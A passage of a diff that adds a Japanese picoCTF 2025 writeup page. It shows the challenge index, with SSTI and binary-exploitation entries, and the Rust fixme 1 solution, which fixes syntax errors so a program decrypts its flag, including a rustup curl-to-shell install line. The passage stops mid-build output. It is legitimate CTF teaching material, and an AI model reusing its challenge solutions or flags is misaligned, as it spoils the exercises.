@@ -1,0 +1,1853 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>picoCTF 2025 Writeup - CTF フラxxグゲット</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://picoctf.org/ 去年（2024年）は、picoCTFに参加することをすっかり忘れてましたが、今年は参加できました。 M1 Mac にしてか" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+
+
+
+<meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
+
+
+<meta name="generator" content="Hugo 0.119.0 with theme even" />
+
+
+<link rel="canonical" href="https://captureamerica.github.io/writeups/post/picoctf_2025/" />
+<link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
+<link rel="manifest" href="https://captureamerica.github.io/writeups/manifest.json">
+<link rel="mask-icon" href="https://captureamerica.github.io/writeups/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="https://captureamerica.github.io/writeups/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
+
+
+
+<meta property="og:title" content="picoCTF 2025 Writeup" />
+<meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://picoctf.org/ 去年（2024年）は、picoCTFに参加することをすっかり忘れてましたが、今年は参加できました。 M1 Mac にしてか" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/picoctf_2025/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2025-04-05T10:00:00+09:00" />
+<meta property="article:modified_time" content="2025-04-05T10:00:00+09:00" />
+<meta itemprop="name" content="picoCTF 2025 Writeup">
+<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://picoctf.org/ 去年（2024年）は、picoCTFに参加することをすっかり忘れてましたが、今年は参加できました。 M1 Mac にしてか"><meta itemprop="datePublished" content="2025-04-05T10:00:00+09:00" />
+<meta itemprop="dateModified" content="2025-04-05T10:00:00+09:00" />
+<meta itemprop="wordCount" content="6361">
+<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="picoCTF 2025 Writeup"/>
+<meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://picoctf.org/ 去年（2024年）は、picoCTFに参加することをすっかり忘れてましたが、今年は参加できました。 M1 Mac にしてか"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="https://captureamerica.github.io/writeups/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="https://captureamerica.github.io/writeups/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="https://captureamerica.github.io/writeups/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="https://captureamerica.github.io/writeups/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="https://captureamerica.github.io/writeups/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">picoCTF 2025 Writeup</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2025-04-05 </span>
+        <div class="post-category">
+            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#general-skills-rust-fixme-1-100-points">[General Skills]: Rust fixme 1 (100 points)</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#general-skills-rust-fixme-2-100-points">[General Skills]: Rust fixme 2 (100 points)</a>
+      <ul>
+        <li><a href="#challenge-1">Challenge</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#general-skills-rust-fixme-3-100-points">[General Skills]: Rust fixme 3 (100 points)</a>
+      <ul>
+        <li><a href="#challenge-2">Challenge</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#general-skills-yararules0x100-200-points">[General Skills]: YaraRules0x100 (200 points)</a>
+      <ul>
+        <li><a href="#challenge-3">Challenge</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-ph4nt0m-1ntrud3r-50-points">[Forensics]: Ph4nt0m 1ntrud3r (50 points)</a>
+      <ul>
+        <li><a href="#challenge-4">Challenge</a></li>
+        <li><a href="#solution-4">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-flags-are-stepic-100-points">[Forensics]: flags are stepic (100 points)</a>
+      <ul>
+        <li><a href="#challenge-5">Challenge</a></li>
+        <li><a href="#solution-5">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-event-viewing-200-points">[Forensics]: Event-Viewing (200 points)</a>
+      <ul>
+        <li><a href="#challenge-6">Challenge</a></li>
+        <li><a href="#solution-6">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-bitlocker-1-200-points">[Forensics]: Bitlocker-1 (200 points)</a>
+      <ul>
+        <li><a href="#challenge-7">Challenge</a></li>
+        <li><a href="#solution-7">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-n0s4n1ty-1-100-points">[Web]: n0s4n1ty 1 (100 points)</a>
+      <ul>
+        <li><a href="#challenge-8">Challenge</a></li>
+        <li><a href="#solution-8">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-ssti2-200-points">[Web]: SSTI2 (200 points)</a>
+      <ul>
+        <li><a href="#challenge-9">Challenge</a></li>
+        <li><a href="#solution-9">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto-even-rsa-can-be-broken-200-points">[Crypto]: EVEN RSA CAN BE BROKEN??? (200 points)</a>
+      <ul>
+        <li><a href="#challenge-10">Challenge</a></li>
+        <li><a href="#solution-10">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#binary-exploitation-pie-time-75-points">[Binary Exploitation]: PIE TIME (75 points)</a>
+      <ul>
+        <li><a href="#challenge-11">Challenge</a></li>
+        <li><a href="#solution-11">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#binary-exploitation-pie-time-2-200-points">[Binary Exploitation]: PIE TIME 2 (200 points)</a>
+      <ul>
+        <li><a href="#challenge-12">Challenge</a></li>
+        <li><a href="#solution-12">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#binary-exploitation-hash-only-1-100-points">[Binary Exploitation]: hash-only-1 (100 points)</a>
+      <ul>
+        <li><a href="#challenge-13">Challenge</a></li>
+        <li><a href="#solution-13">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#binary-exploitation-hash-only-2-200-points">[Binary Exploitation]: hash-only-2 (200 points)</a>
+      <ul>
+        <li><a href="#challenge-14">Challenge</a></li>
+        <li><a href="#solution-14">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
+<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
+<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
+<div class='align-right'>
+<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fpicoctf_2025%2F">
+<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
+</a>
+</div>
+<p>URL: <a href="https://picoctf.org/">https://picoctf.org/</a>
+<br /><br />
+去年（2024年）は、picoCTFに参加することをすっかり忘れてましたが、今年は参加できました。</p>
+<p><br /><br />
+M1 Mac にしてから、CTFがやりにくくなった気がします。。。</p>
+<p><br /><br />
+最終結果は、こんな感じ。</p>
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_Score1.png" alt="picoctf_2025_Score1.png">
+<p><br /><br /></p>
+<p>2610点をとって、最終順位は 1025位でした。
+<br />
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_Rank.png" alt="picoctf_2025_Rank.png"></p>
+<p><br /><br />
+以下は、チャレンジ一覧です。</p>
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_web.png" alt="picoctf_2025_web.png">
+<br />
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_crypto.png" alt="picoctf_2025_crypto.png">
+<br />
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_rev.png" alt="picoctf_2025_rev.png">
+<br />
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_forensics.png" alt="picoctf_2025_forensics.png">
+<br />
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_general.png" alt="picoctf_2025_general.png">
+<br />
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_pwn.png" alt="picoctf_2025_pwn.png">
+<p><br /><br /><br />
+以下、Writeupです。</p>
+<br />
+<h2 id="general-skills-rust-fixme-1-100-points">[General Skills]: Rust fixme 1 (100 points)</h2>
+<hr>
+<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Have you heard of Rust? Fix the syntax errors in this Rust file to print the flag!
+<br /><br />
+Hint1: Cargo is Rust&rsquo;s package manager and will make your life easier. See the getting started page here
+<br />
+Hint2: println!  (<a href="https://doc.rust-lang.org/std/macro.println.html">https://doc.rust-lang.org/std/macro.println.html</a>)
+<br />
+Hint3: Rust has some pretty great compiler error messages. Read them maybe?</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>fixme1.tar.gz</li>
+</ul>
+<br />
+<h3 id="solution">Solution</h3>
+<p>Rustの実行環境がなかったので、<a href="https://www.programiz.com/rust/online-compiler/">オンライン</a>でやればいいやと思ってたんですが、以下のエラーが出て小一時間悩みました。</p>
+<pre>
+unresolved import `xor_cryptor`
+</pre>
+<br />
+<p>結局、RustをKaliにインストールして対応しました。</p>
+<pre>
+$ curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+</pre>
+<br />
+<p>ソースコードの修正をしていきます。</p>
+<p>以下がオリジナル。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="hl"><span class="lnt"> 5
+</span></span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="hl"><span class="lnt">18
+</span></span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="hl"><span class="lnt">25
+</span></span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="k">use</span><span class="w"> </span><span class="n">xor_cryptor</span>::<span class="n">XORCryptor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Key for decryption
+</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&#34;CSUCKS&#34;</span><span class="p">)</span><span class="w"> </span><span class="c1">// How do we end statements in Rust?
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Encrypted flag values
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">hex_values</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s">&#34;41&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;30&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;20&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;63&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;4a&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;45&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;54&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;76&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;01&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;1c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;7e&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;59&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;63&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;e1&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;61&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;25&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;7f&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;5a&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;60&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;50&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;11&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;38&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;1f&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;3a&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;60&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;e9&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;62&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;20&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;0c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;e6&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;50&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;d3&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;35&#34;</span><span class="p">];</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Convert the hexadecimal strings to bytes and collect them into a vector
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">encrypted_buffer</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="kt">u8</span><span class="o">&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hex_values</span><span class="p">.</span><span class="n">iter</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="o">|&amp;</span><span class="n">hex</span><span class="o">|</span><span class="w"> </span><span class="kt">u8</span>::<span class="n">from_str_radix</span><span class="p">(</span><span class="n">hex</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">).</span><span class="n">unwrap</span><span class="p">())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">collect</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Create decrpytion object
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">XORCryptor</span>::<span class="n">new</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">res</span><span class="p">.</span><span class="n">is_err</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line hl"><span class="cl"><span class="w">        </span><span class="n">ret</span><span class="p">;</span><span class="w"> </span><span class="c1">// How do we return in rust?
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">xrc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">res</span><span class="p">.</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Decrypt flag and print it out
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">decrypted_buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xrc</span><span class="p">.</span><span class="n">decrypt_vec</span><span class="p">(</span><span class="n">encrypted_buffer</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line hl"><span class="cl"><span class="w">        </span><span class="s">&#34;:?&#34;</span><span class="p">,</span><span class="w"> </span><span class="c1">// How do we print out a variable in the println function? 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">        </span><span class="nb">String</span>::<span class="n">from_utf8_lossy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">decrypted_buffer</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div>
+<br />
+<br />
+<p>以下が修正後。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="hl"><span class="lnt"> 5
+</span></span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="hl"><span class="lnt">18
+</span></span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="hl"><span class="lnt">25
+</span></span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="k">use</span><span class="w"> </span><span class="n">xor_cryptor</span>::<span class="n">XORCryptor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Key for decryption
+</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&#34;CSUCKS&#34;</span><span class="p">);</span><span class="w"> </span><span class="c1">// How do we end statements in Rust?
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Encrypted flag values
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">hex_values</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s">&#34;41&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;30&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;20&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;63&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;4a&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;45&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;54&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;76&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;01&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;1c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;7e&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;59&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;63&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;e1&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;61&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;25&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;7f&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;5a&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;60&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;50&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;11&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;38&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;1f&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;3a&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;60&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;e9&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;62&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;20&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;0c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;e6&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;50&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;d3&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;35&#34;</span><span class="p">];</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Convert the hexadecimal strings to bytes and collect them into a vector
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">encrypted_buffer</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="kt">u8</span><span class="o">&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hex_values</span><span class="p">.</span><span class="n">iter</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="o">|&amp;</span><span class="n">hex</span><span class="o">|</span><span class="w"> </span><span class="kt">u8</span>::<span class="n">from_str_radix</span><span class="p">(</span><span class="n">hex</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">).</span><span class="n">unwrap</span><span class="p">())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">collect</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Create decrpytion object
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">XORCryptor</span>::<span class="n">new</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">res</span><span class="p">.</span><span class="n">is_err</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line hl"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"> </span><span class="c1">// How do we return in rust?
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">xrc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">res</span><span class="p">.</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Decrypt flag and print it out
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">decrypted_buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xrc</span><span class="p">.</span><span class="n">decrypt_vec</span><span class="p">(</span><span class="n">encrypted_buffer</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line hl"><span class="cl"><span class="w">        </span><span class="s">&#34;</span><span class="si">{}</span><span class="s">&#34;</span><span class="p">,</span><span class="w"> </span><span class="c1">// How do we print out a variable in the println function? 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">        </span><span class="nb">String</span>::<span class="n">from_utf8_lossy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">decrypted_buffer</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div>
+<br />
+<p>実行結果。</p>
+<pre>
+$ cargo run --release --bin rust_proj
+   Compiling crossbeam-utils v0.8.20
+   Compiling rayon-core v1.12.1
+   Compiling either v1.13.0
+   Compiling crossbeam-epoch v0.9.18
+   Compiling crossbeam-deque v0.8.5
+   Compiling rayon v1.10.0
+   Compiling xor_cryptor v1.2.3
+   Compiling rust_proj v0.1.0 (/mnt/hgfs/Mac_Downloads/fixme1)
